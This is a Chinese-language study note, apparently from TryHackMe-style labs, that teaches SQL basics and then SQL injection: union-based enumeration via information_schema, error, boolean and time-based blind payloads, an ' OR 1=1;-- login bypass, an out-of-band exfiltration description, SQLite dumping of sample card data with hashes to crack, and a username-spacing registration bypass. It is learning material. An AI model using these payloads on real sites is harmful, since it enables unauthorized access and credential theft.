`+-------------------+ | email             | +-------------------+ | alice@qq.com      | | bob@qq.com        | | charlie@qq.com    | +-------------------+`

---

## **4️⃣ 总结成流程图**

1. **找数据库** → `information_schema.schemata` → 确认数据库名
    
2. **找表** → `information_schema.tables` → 确认表名
    
3. **找列** → `information_schema.columns` → 确认列名
    
4. **取数据** → `SELECT column_name FROM database.table` → 获取内容
    

可以把它理解成**从楼顶找清单 → 房间 → 抽屉 → 取东西**，每一级都对应一张 `information_schema` 表。







## SQL语法

### 自动化工具

验证能否注入：sqlmap




### **SELECT  选择**


1.我们将学习的第一个查询类型是用于从数据库中检索数据的 SELECT 查询。



`select * from users;`

  

|        |                   |                  |
| ------ | ----------------- | ---------------- |
| **id** | **username  用户名** | **password  密码** |
| 1      | jon  乔恩           | pass123          |
| 2      | admin  管理         | p4ssword         |
| 3      | martin  马丁        | secret123        |

第一个单词 SELECT 告诉数据库我们要检索一些数据;* 告诉数据库我们要从表中接收所有列。例如，该表可能包含三列（id、用户名和密码）。“来自用户”告诉数据库我们要从名为 users 的表中检索数据。最后，末尾的分号告诉数据库这是查询的结束。







2.下一个查询与上面类似，但这一次，我们不是使用 * 返回数据库表中的所有列，而是只请求用户名和密码字段。


`select username,password from users;`

  

|                   |                  |
| ----------------- | ---------------- |
| **username  用户名** | **password  密码** |
| jon  乔恩           | pass123          |
| admin  管理         | p4ssword         |
| martin  马丁        | secret123        |




3.以下查询与第一个查询一样，使用 * 选择器返回所有列，然后“LIMIT 1”子句强制数据库仅返回一行数据。将查询更改为“LIMIT 1,1”会强制查询跳过第一个结果，然后“LIMIT 2,1”会跳过前两个结果，依此类推。您需要记住，第一个数字告诉数据库您希望跳过多少结果，第二个数字告诉数据库要返回多少行。
`   select * from users LIMIT 1;`

  

|        |                   |                  |
| ------ | ----------------- | ---------------- |
| **id** | **username  用户名** | **password  密码** |
| 1      | jon  乔恩           | pass123          |


4.最后，我们将使用 where 子句;这就是我们如何通过返回与我们的特定子句匹配的数据来精细地挑选出我们需要的确切数据：

  

`select * from users where username='admin';`

  

|        |                   |                  |
| ------ | ----------------- | ---------------- |
| **id** | **username  用户名** | **password  密码** |
| 2      | admin  管理         | p4ssword         |


5.这只会返回用户名  **不**  等于 admin 的行。

`select * from users where username != 'admin';`

  

|   |   |   |
|---|---|---|
|**id**|**username  用户名**|**password  密码**|
|1|jon  乔恩|pass123  通行证123|
|3|martin  马丁|secret123  秘密123|


6.这将仅返回用户名 等于 **admin** 或 **jon** 的行
`select * from users where username='admin' or username='jon';`

  

|   |   |   |
|---|---|---|
|**id**|**username  用户名**|**password  密码**|
|1|jon  乔恩|pass123  通行证123|
|2|admin  管理|p4ssword  P4SS 剑|




7.这只会返回用户名  等于 **admin** 且密码  等于 **p4ssword** 的行.

`select * from users where username='admin' or username='jon';`

  

|   |   |   |
|---|---|---|
|**id**|**username  用户名**|**password  密码**|
|1|jon  乔恩|pass123  通行证123|
|2|admin  管理|p4ssword  P4SS 剑|

8.使用 like 子句允许您指定不完全匹配的数据，而是通过选择放置由百分号 % 表示的通配符的位置，以某些字符开头、包含或结尾。

  

`select * from users where username like 'a%';`

  

|   |   |   |
|---|---|---|
|**id**|**username  用户名**|**password  密码**|
|2|admin  管理|p4ssword  P4SS 剑|
这将返回用户名以字母 a 开头的任何行。



9.这将返回用户名以字母 n 结尾的任何行
`   select * from users where username like '%n';`

  

|   |   |   |
|---|---|---|
|**id**|**username  用户名**|**password  密码**|
|1|jon  乔恩|pass123  通行证123|
|2|admin  管理|p4ssword  P4SS 剑|
|3|martin  马丁|secret123  秘密123|






10.这将返回用户名 包含字符 **mi**  的任何行。
`select * from users where username like '%mi%';`

  

|   |   |   |
|---|---|---|
|**id**|**username  用户名**|**password  密码**|
|2|admin  管理|p4ssword  P4SS 剑|









### **UNION**
将两个表单拼接起来
此查询的规则是 UNION 语句必须在每个 SELECT 语句中检索相同数量的列，列必须具有相似的数据类型，并且列顺序必须相同


eg：假设一家公司想要为所有客户和供应商创建一个地址列表，以便发布新目录。我们有一个名为客户的表，内容如下：



|   |   |   |   |   |
|---|---|---|---|---|
|**id**|**name  名字**|**address  地址**|**city  城市**|**postcode  邮政编码**|
|1|Mr John Smith  John Smith 先生|123 Fake Street  假街123号|Manchester  曼彻斯特|M2 3FJ|
|2|Mrs Jenny Palmer  珍妮·帕尔默夫人|99 Green Road  绿道99号|Birmingham  伯明翰|B2 4KL|
|3|Miss Sarah Lewis  莎拉·刘易斯小姐|15 Fore Street  福尔街15号|London  伦敦|NW12 3GH|

And another called suppliers with the following contents:  
还有一个打电话给供应商，内容如下：

  

|   |   |   |   |   |
|---|---|---|---|---|
|**id**|**company  公司**|**address  地址**|**city  城市**|**postcode  邮政编码**|
|1|Widgets Ltd  小部件有限公司|Unit 1a, Newby Estate  <br>纽比庄园 1a 单元|Bristol  布里斯托尔|BS19 4RT  BS19 4RT 型|
|2|The Tool Company  工具公司|75 Industrial Road  工业路75号|Norwich  诺维奇|N22 3DR|
|3|Axe Makers Ltd  斧头制造商有限公司|2b Makers Unit, Market Road  <br>2b 创客单位，市场路|London  伦敦|SE9 1KK|

使用以下 SQL 语句，我们可以从两个表中收集结果并将它们放入一个结果集中：


```SQL
SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;
```


|   |   |   |   |
|---|---|---|---|
|**name  名字**|**address  地址**|**city  城市**|**postcode  邮政编码**|
|Mr John Smith  John Smith 先生|123 Fake Street  假街123号|Manchester  曼彻斯特|M2 3FJ|
|Mrs Jenny Palmer  珍妮·帕尔默夫人|99 Green Road  绿道99号|Birmingham  伯明翰|B2 4KL|
|Miss Sarah Lewis  莎拉·刘易斯小姐|15 Fore Street  福尔街15号|London  伦敦|NW12 3GH|
|Widgets Ltd  小部件有限公司|Unit 1a, Newby Estate  纽比庄园 1a 单元|Bristol  布里斯托尔|BS19 4RT  BS19 4RT 型|
|The Tool Company  工具公司|75 Industrial Road  工业路75号|Norwich  诺维奇|N22 3DR|
|Axe Makers Ltd  斧头制造商有限公司|2b Makers Unit, Market Road  <br>2b 创客单位，市场路|London  伦敦|SE9 1KK|






### INSERT  插入

```sql
insert into users (username,password) values ('bob','password123');




sql
INSERT INTO users (id, username, age)
VALUES (2, 'Bob', 21),(3, 'Charlie', 22);
```
(第二个是一次插入多行)


**INSERT** 语句告诉数据库我们希望将一行新数据插入到表 中 。“**into users”** 告诉数据库我们希望将数据插入到哪个表中， **“（username，password）”** 提供我们为其提供数据的列，然后  **是“values （'bob'，'password'）;”** 提供先前指定的列的数据。

|   |   |   |
|---|---|---|
|**id**|**username  用户名**|**password  密码**|
|1|jon  乔恩|pass123  通行证123|
|2|admin  管理|p4ssword  P4SS 剑|
|3|martin  马丁|secret123  秘密123|
|4|bob  鲍勃|password123  密码123|

###  UPDATE  更新

**UPDATE** 语句告诉数据库我们希望更新表中的一行或多行数据。您可以使用“**update %tablename% SET**”指定要更新的表 ，然后选择要更新的一个或多个字段作为逗号分隔的列表，例如“**username='root'，password='pass123'**”，最后，与 SELECT 语句类似，您可以使用 where 子句（例如 “**where username='admin;**” 指定要更新的行 。

```sql
update users SET username='root',password='pass123' where username='admin';
```
```sql


格式如下
UPDATE table_name
SET column1 = value1, column2 = value2, ...
WHERE condition;

```






###  DELETE  删除
**DELETE** 语句告诉数据库我们希望删除一行或多行数据。除了缺少要返回的列外，此查询的格式与 SELECT 非常相似。您可以使用 where 子句精确 指定要删除的数据 ，并使用 **LIMIT** 子句指定 要删除的行数。
```sql
delete from users where username='martin';

格式如下
DELETE FROM table_name
WHERE condition;


```

- `table_name` → 需要删除数据的表
    
- `WHERE` → 限定删除哪些行（一定要小心写！）



# Mysql 中常用的函数

-------------------------------------  
version():查询数据库的版本  
user():查询数据库的使用者  
database():数据库  
system_user():系统用户名  
session_user():连接数据库的用户名  
current_user():当前用户名  
load_file():读取本地文件  
@@datadir:读取数据库路径  
@@basedir:mysql安装路径  
 @@version_complie_os:查看操作系统  
-------------------------------------
ascii(str):返回给定字符的ascii值。如果str是空字符串，返回0如果str是NULL，返回NULL。如 ascii("a")=97  
length(str) : 返回给定字符串的长度，如 length("string")=6  
substr(string,start,length):对于给定字符串string，从start位开始截取，截取length长度 ,如 substr("chinese",3,2)="in"  
substr()、stbstring()、mid() :三个函数的用法、功能均一致  
concat(username)：将查询到的username连在一起，默认用逗号分隔  
concat(str1,'*',str2)：将字符串str1和str2的数据查询到一起，中间用*连接  
group_concat(username) ：将username所有数据查询在一起，用逗号连接  
limit 0,1：查询第1个数 limit 1,1：查询第2个数







## **What is a database?  什么是数据库？**


数据库是一种以有组织的方式以电子方式存储数据集合的方式。数据库由 DBMS 控制，DBMS 是数据库管理系统的首字母缩写词。DBMS 分为两个阵营：关系型和非关系型;本室的重点将放在关系数据库上;您会遇到的一些常见数据库是 MySQL、Microsoft SQL Server、Access、PostgreSQL 和 SQLite。




在 DBMS 中，您可以拥有多个数据库，每个数据库都包含自己的一组相关数据。例如，您可能有一个名为“ **商店** ”的数据库。在此数据库中，您希望存储有关可供**购买**的产品、已注册您的在线商店**的用户**以及有关您收到的**订单**的信息。您可以使用称为表的东西将此信息单独存储在数据库中。这些表都用每个表的唯一名称进行标识。您可以在下图中看到这种结构，但您也可以看到企业可能拥有其他单独的数据库来存储员工信息或客户团队。
![[Pasted image 20250915212709.png]]


## **What are tables?  什么是表格？**

表格由列和行组成;想象表格的一种有用方法就像一个网格，列从上到右穿过包含单元格的名称，行从上到下，每个行都有实际数据。
![[Pasted image 20250915212730.png]]

**Columns:  列：**


每列，最好称为字段，每个表都有一个唯一的名称。创建列时，您还可以设置它将包含的数据类型，常见的是整数（数字）、字符串（标准文本）或日期。一些数据库可以包含更复杂的数据，例如包含位置信息的地理空间。设置数据类型还可以确保不会存储不正确的信息，例如字符串“hello world”存储在用于日期的列中。如果发生这种情况，数据库服务器通常会生成一条错误消息。包含整数的列也可以启用自动递增功能;这为每行数据提供了一个唯一的数字，该数字随着每个后续行而增长（递增）。这样做会创建所谓的**键**字段;对于每一行数据，键字段必须是唯一的，可用于在 SQL 查询中查找确切的行。

  
Rows:  行：

行或记录包含单独的数据行。将数据添加到表时，将创建新的行/记录;删除数据时，将删除行/记录。





##  DBMS 的类型

1. **关系型数据库管理系统（RDBMS）**
    
    - 数据以表（行和列）形式存储。
        
    - 支持 SQL 查询。
        
    - **例子**：MySQL、PostgreSQL、Oracle、SQL Server
        
2. **非关系型数据库（NoSQL DBMS）**
    
    - 数据存储方式多样：键值对、文档、列族或图。
        
    - 灵活扩展，适合大数据、分布式场景。
        
    - **例子**：MongoDB、Redis、Cassandra
        
3. **层次型数据库**
    
    - 数据以树状结构存储。
        
    - **例子**：IBM IMS
        
4. **网状数据库**
    
    - 数据用图的形式存储，节点和边表示关系。
        
    - **例子**：IDMS





# SQL注入[SQL注入大全][从0到1，SQL注入（sql十大注入类型）收藏这一篇就够了，技术解析与实战演练 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/404072.html)




我们通常使用   ”   或者   ’   来检测是否有SQL漏洞，如果返回一个错误信息，说明可以SQL注入。
然后我们可以使用union来测试一下表格有多少列。
```sql
id=1 union select 1

失败

id=1 union select 1,2
失败


id=1 union select 1,2,3

成功

```
由此可知我们的表单有三列。

或者我们使用order by来测试有几列

正常order by 是进行排序，
加入order by score 就是按照score列进行默认升序排列
如果 order by score [DESC]
那就是按降序排列

`?id=1' ORDER BY 3 --+`

当 `ORDER BY N` 报错时，说明查询结果列数少于 N，从而推测出列数。

- --+:在SQL中，两个短横线（`--`）是一个注释的开始。这意味着在`--`之后的所有内容都将被数据库忽略。`+` 在这里可能是为了“欺骗”某些应用程序或框架，这些应用程序或框架可能会错误地解析URL查询字符串中的`+`字符为空格（虽然在这种情况下，`+`字符在注释之后，所以实际上它没有任何作用）
- **在某些数据库（特别是 MySQL）里，`--` 注释后面**必须跟至少一个空格**才能生效

- 所以 `--+` 就等价于 `--<空格>`，保证注释语法合法








使用 SQL 的 Web 应用程序可以变成 SQL 注入的点是当用户提供的数据包含在 SQL 查询中时。



假设文章 ID 2 被锁定为私有，因此无法在网站上查看。我们现在可以调用 URL：

https://website.thm/blog?id=2;--
然后，这将生成 SQL 语句：
SELECT * from blog where id=2;-- and private=0 LIMIT 1;

**URL 中的分号表示 SQL 语句的结束，两个破折号导致之后的所有内容都被视为注释** 。通过这样做，您实际上只是在运行查询：

SELECT * from blog where id=2;--



==即通过--使得后面的private=0这个权限代码消失，从而攻击。==


常见类型有：

| 类型                                    | 说明                     | 示例                                                                   |
| ------------------------------------- | ---------------------- | -------------------------------------------------------------------- |
| **In-Band SQLi（带内注入）**                | 最常见，结果直接显示在页面上         | `' UNION SELECT username, password FROM users --+`                   |
| **Error-Based SQLi（基于错误）**            | 触发数据库错误，通过报错信息获取数据     | `' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version, 0x7e)) --+`           |
| **Union-Based SQLi（联合查询）**            | 用 `UNION` 拼接数据到结果集     | `' UNION SELECT table_name, NULL FROM information_schema.tables --+` |
| **Blind SQLi（盲注）**                    | 页面不显示结果，通过判断真/假或延时推测数据 | `' AND IF(SUBSTR(@@version,1,1)='5', SLEEP(5), 0) --+`               |
| **Time-Based Blind SQLi（基于时间的盲注）**    | 用延时函数判断条件              | 同上，利用 `SLEEP()`                                                      |
| **Boolean-Based Blind SQLi（基于布尔的盲注）** | 用页面响应变化判断条件            | `' AND 1=1 --+` vs `' AND 1=2 --+`                                   |



### **In-Band SQLi（带内注入）**


```sql 
eg：0 UNION SELECT 1,2,group_concat(table_name)
FROM information_schema.tables
WHERE table_schema = '数据库名'





database（）

获取表单名称



group_concat（）


它会把一组行的值连接成一行字符串，并用逗号（默认）分隔。

你可以把它理解为：“把一列里所有值拼成一串”。



group_concat（table_name）

table_name指表名

information_schema 是 MySQL 内置的元数据库，存储所有数据库的结构信息
- information_schema.chemata: 该数据表存储了 mysql 数据库中的所有数据库的`库名`
    
- information_schema.tables： 该数据表存储了 mysql 数据库中的所有数据表的`表名`
    
- information_schema.columns: 该数据表存储了 mysql 数据库中的所有列的`列名`
  
  

    
tables 表里有所有数据库的所有表名




table_schema 表示表所在的数据库名
    
    
这里过滤，只要数据库名是 'sqli_one' 的表


 `columns`（列层）

位置：`information_schema.columns`
  
作用：所有表里每一列的信息



```


由于第一关旨在发现 Martin 的密码，因此 staff_users 表是我们感兴趣的。我们可以再次利用 information_schema 数据库，使用以下查询查找此表的结构。

`0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'`
这类似于前面的 SQL 查询。但是，我们要检索的信息已从 table_name 更改为 **column_name**，我们在 information_schema 数据库中查询的表已从表更改为  **列** ，并且我们正在搜索 table_name 列值为 staff_users 的任何行

查询结果为 staff_users 表提供三列：id、password 和 username。我们可以将用户名和密码列用于以下查询来检索用户的信息。

`0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users`

同样，我们使用 group_concat 方法将所有行返回到一个字符串中，使其 更易于阅读。我们还添加了 **，'：' 来**  将用户名和密码彼此拆分。我们没有用逗号分隔，而是选择了 HTML **<br>** 标签，该标签强制每个结果位于单独的行中，以便于阅读。
（SEPARATOR是自定义分割符的意思）







### **Blind SQLi（盲注）**


#### Blind SQLi - Authentication Bypass  （盲注） - 身份验证绕过
SQL 注入示例的第二级显示了这个确切的示例。我们可以在标有“SQL 查询”的框中看到，对数据库的查询如下：

  

`select * from users where username='%username%' and password='%password%' LIMIT 1;`


要将其转换为始终返回为 true 的查询，我们可以在密码字段中输入以下内容：

  

`' OR 1=1;--`


这将 SQL 查询转换为以下内容：

  

`select * from users where username='' and password='' OR 1=1;`


因为 1=1 是一个 true 语句，并且我们使用 了 **OR** 运算符，所以这将始终导致查询返回为 true，这满足 Web 应用程序逻辑，即数据库找到了有效的用户名/密码组合，并且应该允许访问。





#### Blind SQLi - Boolean Based  （盲注） - 基于布尔值

处理的 SQL 查询如下所示：

  

`select * from users where username = '%username%' LIMIT 1;`

与之前的级别一样，我们的首要任务是建立用户表中的列数，这可以通过使用 UNION 语句来实现。将用户名值更改为以下值：

  

`admin123' UNION SELECT 1;--`

由于 Web 应用程序已将值  **视为**  false 进行响应，因此我们可以确认这是列的错误值。继续添加更多列，直到我们得到  true 的 取值 。您可以通过将用户名设置为以下值来确认答案为三列：

  

`admin123' UNION SELECT 1,2,3;--`



现在我们的列数已经确定，我们可以进行数据库枚举。我们的首要任务是发现数据库名称。我们可以通过使用内置的 **database（）** 方法，然后使用 **like** 运算符尝试查找将返回真实状态的结果来做到这一点。

Try the below username value and see what happens:  
尝试以下用户名值，看看会发生什么：

  

`admin123' UNION SELECT 1,2,3 where database() like '%';--`

我们得到一个真正的响应，因为在 like 运算符中，我们只有 % 的 值 ，它将匹配任何内容，因为它是通配符值。如果我们将通配符运算符更改为 **a%，** 您会看到响应返回为 false，这确认数据库名称不以字母 **a** 开头 。我们可以循环浏览所有字母、数字和字符，例如 - 和 _，直到找到匹配项。如果您发送以下作为用户名值，您将收到一个  **真实**  的响应，确认数据库名称以字母 **s** 开头.

  

`admin123' UNION SELECT 1,2,3 where database() like 's%';--`现在，您继续读取  数据库名称的下一个字符，直到找到另一个真实响应，例如，'sa%'、'sb%'、'sc%' 等。继续此过程，直到发现数据库名称的所有字符，即 **sqli_three**.


我们已经建立了数据库名称，现在我们可以使用它来枚举表名，方法是利用 information_schema 数据库，使用类似的方法枚举表名。尝试将用户名设置为以下值：

  

`admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--`


此查询在数据库名称与 **sqli_three** 匹配 且表名以字母 a 开头的 tables 表中 查找 information_schema 数据库中 的结果 。由于上述查询导致  **错误**  响应，我们可以确认 sqli_three 数据库中没有以字母 a 开头的表。

和以前一样，你需要循环浏览字母、数字和字符，直到找到正匹配项。您最终会在 sqli_three 数据库中发现一个名为 users 的表，您可以通过运行以下用户名有效负载来确认该表：

  

`admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--`


最后，我们现在需要枚举 users 表中的 列名 ，以便我们可以正确地搜索登录凭据。 同样，我们可以使用 information_schema 数据库和我们已经获得的信息来查询列名。使用下面的有效负载，我们搜索  数据库等于 sqli_three、表名为 users、列名以字母 a 开头的列 表。

  

`admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';`



同样， 您需要循环浏览字母、数字和字符，直到找到匹配项。当您在查找多个结果时，每次找到新列名时都必须将其添加到有效负载中，以避免发现相同的列名。例如，找到名为 id 的 列后 ，会将其附加到原始有效负载中（如下所示）。

  

`admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';`




重复此过程三次将使您能够发现列的 ID、用户名和密码。现在您可以使用它来查询用户表中的  登录凭据。 首先，您需要找到一个有效的用户名，您可以使用下面的有效负载：

  

`admin123' UNION SELECT 1,2,3 from users where username like 'a%`



循环浏览所有字符后，您将确认用户名  **管理员**的存在 。现在你已经有了用户名。您可以专注于发现密码。下面的有效负载显示了如何查找密码：

  

`admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%`


循环浏览所有字符，您会发现密码。




#### **Time-Based Blind SQLi（基于时间的盲注）**


基于时间的盲 SQL 注入与上述基于 布尔值的 SQL 注入非常相似，因为发送了相同的请求，但这次没有视觉指示您的查询是错误的还是正确的。相反，正确查询的指示器基于查询完成所需的时间。此时间延迟是使用内置方法（例如 **SLEEP（x）** ）和 UNION 语句引入的。SLEEP（） 方法只有在成功的 UNION SELECT 语句时才会执行。


因此，例如，在尝试建立表中的列数时，可以使用以下查询：

  

`admin123' UNION SELECT SLEEP(5);--`


如果响应时间没有暂停，我们就知道查询不成功，因此与之前的任务一样，我们添加另一列：

  

`admin123' UNION SELECT SLEEP(5),2;--`


此有效负载应产生 5 秒的延迟，确认 UNION 语句已成功执行，并且有两列。



基于布尔值的 SQL 注入，将 SLEEP（） 方法添加到  **UNION SELECT  联合选择** statement.  陈述。




#### Out-of-Band SQLi  带外 SQLi


带外攻击通过具有两个不同的通信通道进行分类，一个用于发起攻击，另一个用于收集结果。例如，攻击通道可以是 Web 请求，数据收集通道可以监视对您控制的服务发出的 HTTP/DNS 请求。

1) An attacker makes a request to a website vulnerable to SQL Injection with an injection payload.  
1） 攻击者使用注入有效负载向易受 SQL 注入攻击的网站发出请求。

2) The Website makes an SQL query to the database, which also passes the hacker's payload.  
2） 网站对数据库进行 SQL 查询，该数据库也传递黑客的有效负载。

3) The payload contains a request which forces an HTTP request back to the hacker's machine containing data from the database.  
3） 有效负载包含一个请求，该请求强制将 HTTP 请求返回到包含数据库数据的黑客机器。

![[Pasted image 20250916223331.png]]


## 触发方式

带外 SQLi 通常依赖以下数据库功能：

| 功能          | 描述                                          |
| ----------- | ------------------------------------------- |
| **DNS 查询**  | 使用数据库函数发起 DNS 请求，把数据嵌入域名 → 攻击者控制的 DNS 服务器接收 |
| **HTTP 请求** | 使用数据库函数发起 HTTP 请求，将数据发送到攻击者控制的服务器           |









#  OWASP Top 10 - 2021


## Cryptographic Failures  加密失败
平面文件数据库最常见（也是最简单）的格式是 SQLite 数据库。这些可以在大多数编程语言中进行交互，并有一个专用的客户端用于在命令行上查询它们。该客户端称为 `sqlite3`，默认安装在许多 Linux 发行版上。


假设我们已经成功下载了一个数据库：
```bash
user@linux$ ls -l -rw-r--r-- 1 user user 8192 Feb 2 20:33 example.db 


user@linux$ file example.db 
example.db: SQLite 3.x database, last written using SQLite version 3039002, file counter 1, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 1
```

我们可以看到example.db 是sqllite3数据库

为了访问他，我们使用 `sqlite3 <database-name>`



```bash
user@linux$ sqlite3 example.db 
SQLite version 3.39.2 2022-07-21 15:24:47 
Enter ".help" for usage hints. 
sqlite>

```
此时，我们可以转储表中的所有数据，但除非我们查看表信息，否则我们不一定知道每列的含义。首先，让我们使用 `PRAGMA table_info（目标）;` 以查看表信息。然后我们将使用 `SELECT * FROM 目标;` 要从表中转储信息，请执行以下操作：

```bash
sqlite> PRAGMA table_info(customers); 
0|cudtID|INT|1||1 
1|custName|TEXT|1||0 
2|creditCard|TEXT|0||0 
3|password|TEXT|1||0 



sqlite> SELECT * FROM customers; 
0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99 
1|John Walters|4671 5376 3366 8125|fef08f333cc53594c8097eba1f35726a 
2|Lena Abdul|4353 4722 6349 6685|b55ab2470f160c331a99b8d8a1946b19 
3|Andrew Miller|4059 8824 0198 5596|bc7b657bd56e4386e3397ca86e378f70 
4|Keith Wayman|4972 1604 3381 8885|12e7a36c0710571b3d827992f4cfe679 
5|Annett Scholz|5400 1617 6508 1166|e2795fc96af3f4d6288906a90a52a47f
```



从表格信息中我们可以看到，有四列：`custID`、`custName`、`creditCard` 和 `password`


密码是哈希值，破解即可。


# 一个用于查询之前版本服务是否有漏洞的web


[Exploit-DB](https://www.exploit-db.com/)




# 注册用户名绕过


网站一般会用 `username` 来区分不同用户，如果检查不严格，可能会出现以下情况：

- 数据库里有一个账号：`admin`
    
- 你尝试注册新用户，输入的用户名是 `" admin"`（前面带一个空格）
可以获得和admin相同的权限。


